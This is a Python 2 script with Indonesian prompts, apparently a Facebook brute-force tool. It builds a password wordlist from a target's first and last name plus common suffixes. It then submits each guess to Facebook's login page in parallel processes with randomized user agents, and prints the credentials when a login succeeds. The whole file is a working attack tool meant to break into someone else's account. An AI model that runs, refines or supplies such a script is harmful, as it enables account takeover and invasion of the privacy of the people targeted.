# -*- coding UTF-8 -*-
#  Author : Iqbal Dev
#  Tools : Geli2 Efbeh
#  Versi : 0.1

from prettytable import PrettyTable
from useragents import user_agents, string1, string2
import os, sys, time, random, cookielib, mechanize, multiprocessing
s = '\n  \033[92;1m          Suksess... \n         Password Found '
deV = []
DEv = []
def data():
	Iqbal = open('sim.txt', 'r').read()
	Ivana = open('pass.txt', 'w')
	Ivana.write(Iqbal)
	Ivana.close()
	os.remove('sim.txt')

def Wordlist():

	try:
		print string1
		print "\033[96;1m        B U A T   W O R D L I $ T "
		print '\033[92;1m+'+'-'*38+'+' 
		nama1 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Depan Target\033[93;1m : ")
		nama2 = raw_input("\033[96;1m [\033[95;1m!\033[96;1m]\033[97;1m Masukkan Nama Belakang Target\033[93;1m : ")
		if nama1 == '' or nama2 == '':
			sys.exit("\n\033[91;1m Jangan Kosong dong Sayang!\n Kamu Keluar...")
		d = nama1.replace(' ', '').replace('  ', '')
		b = nama2.replace(' ', '').replace('  ', '')

		lis = ['123','1234','12345']
		deV.append('bimillah')
		for dev in lis:
			deV.append(nama1+dev)
                deV.append('sayang')
		deV.append(nama1+nama2)
		deV.append(nama1+nama2+'123')
		for dev in lis:
			DEv.append(nama2+dev)
                DEv.append('anjing')
		DEv.append(nama2+nama1)
		DEv.append(nama2+nama1+'123')

		# deV.append(nama1+nama2)
		# deV.append(nama1+nama2+)

		# deV.append(d+"123," + d+"1234\n" + d+'12345\n' + b+'123\n' + b+'1234\n' + b+'12345\n')
		# DEv.append(d + "\n" + b+'\n' + d+b+'\n' + b+d+'\n' + d+b+'123\n' + b+d+'123\n' + 'sayang\n')
		
		# dat2 = open('pass.txt', 'r').read()
		# defid = open('sim.txt', 'w')
		# defid.write(dat2)
		# defid.close()

		# dat1 = open('word.txt', 'r').read()
		# datku = open('word.txt', 'a')
		# datku.write(dat2)
		# datku.close()

		# datz = open('word.txt', 'r').read()
		# has = open('pass.txt', 'w')
		# has.write(datz)
		# has.close()
		# os.remove('word.txt')

		time.sleep(1)

		# di = open("pass.txt", "r").read()
		# tam = open("word.txt", "a")
		# tam.write(di)
		# tam.close()


	except KeyboardInterrupt:

		print "\n Keluar.... "

	print " \n\033[92;1m Suksess Membuat Wordlist..."
		

dev = mechanize.Browser()
cok = cookielib.LWPCookieJar()
dev.set_handle_robots(False)
dev.set_handle_redirect(True)
dev.set_cookiejar(cok)
dev.set_handle_equiv(True)
dev.set_handle_referer(True)
dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)


# DEv = open('word1.txt', 'r').readlines()
# deV = open('word2.txt', 'r').readlines()
lol = 'https://www.facebook.com/login.php?login_attempt=1'
usr = open('pass.txt', 'r').read()


def target():
	global target

	# os.system('cls' if os.name == 'nt' else 'clear')
	print string2
	user = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Username Target:\n\033[93;1m  => \033[97;1m ")
	print '+'+'-'*38+'+'
	pasw = open('pass.txt', 'w')
	pasw.write(user)
	pasw.close() 
	

def br_dev1(deV):
	        usr = open('pass.txt', 'r').read()
		for Dev in deV:
		  try:
			wak = time.ctime()
			pas = Dev.replace('\n', '')
			print '\033[96;1m ' + wak + " \033[95;1m" + pas 
			dev.addheaders = [('User_agent', random.choice(user_agents))]
			url = dev.open(lol)
			dev.select_form(nr = 0)
			dev.form['email'] = usr
			dev.form['pass'] = pas
			mleb = dev.submit()
			meki = mleb.geturl()
			if meki != lol and (not 'login_attempt' in meki):
				x = PrettyTable()
				print s
				x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
				x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
				print '\033[97;1m'
				print x
				raw_input('\033[96;1m\n\n Tekan CTRL + Z + Enter Untuk exit..\n\n')
			##	data()
                                time.sleep(100)
				exit("\n Keluar....")
		  except:
			pass
		  	
		


def br_dev2(DEv):
                usr = open('pass.txt', 'r').read()
		for Dev in DEv:
		  try:
			wak = time.ctime()
			pas = Dev.replace('\n', '')
			print '\033[92;1m ' + wak + " \033[95;1m" + pas 
			dev.addheaders = [('User_agent', random.choice(user_agents))]
			url = dev.open(lol)
			dev.select_form(nr = 0)
			dev.form['email'] = usr
			dev.form['pass'] = pas
			mleb = dev.submit()
			meki = mleb.geturl()
			if meki != lol and (not 'login_attempt' in meki):
				x = PrettyTable()
				print s
				x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
				x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
				print '\033[97;1m'
				print x
				raw_input('\033[96;1m\n\n Tekan CTRL + Z + Enter Untuk exit..\n\n')
			##	data()
                                time.sleep(100)
				exit("\n Keluar....")
		  except:
			pass

def brute():
	Wordlist()
	target()
	try:
		thr1 = multiprocessing.Process(target=br_dev1, args=(deV,))
		thr2 = multiprocessing.Process(target=br_dev2, args=(DEv,))
		thr1.start()
		thr2.start()
		thr1.join()
		thr2.join()
	except KeyboardInterrupt:
		exit('\n Keluar.... \n')

	print '\n\033[91;1m    Tidak Ada Yang Cocok.. \n'


